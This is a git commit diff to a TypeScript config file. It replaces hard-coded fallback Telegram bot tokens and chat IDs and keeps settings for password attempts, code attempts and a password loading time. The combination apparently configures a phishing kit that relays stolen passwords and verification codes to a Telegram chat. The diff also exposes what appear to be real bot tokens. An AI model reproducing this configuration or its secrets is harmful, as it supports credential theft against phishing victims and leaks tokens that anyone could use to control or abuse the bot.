0f384e8dbdb04e4eb8a1fe1ef54aa16030c48e17
qoteckarl-alt <qoteckarl@gmail.com>
2026-09-16 07:15:59 +0700

    Update config.ts

--- src/utils/config.ts
+++ src/utils/config.ts
@@ -1,6 +1,6 @@
 const config = {
-    token: process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ?? '8840336917:AAE_9Vi3fikSDx4eJqJXG6LiFbe_tagfwiQ',
-    chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? '-1004375864002',
+    token: process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN ?? '8962143082:AAHXmu4aK7YObfVMct64HZbcwJrvDUZY3k4',
+    chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? '-1004457804183',
     MAX_PASS: 2,
     MAX_CODE: 4,
     PASSWORD_LOADING_TIME: 8,
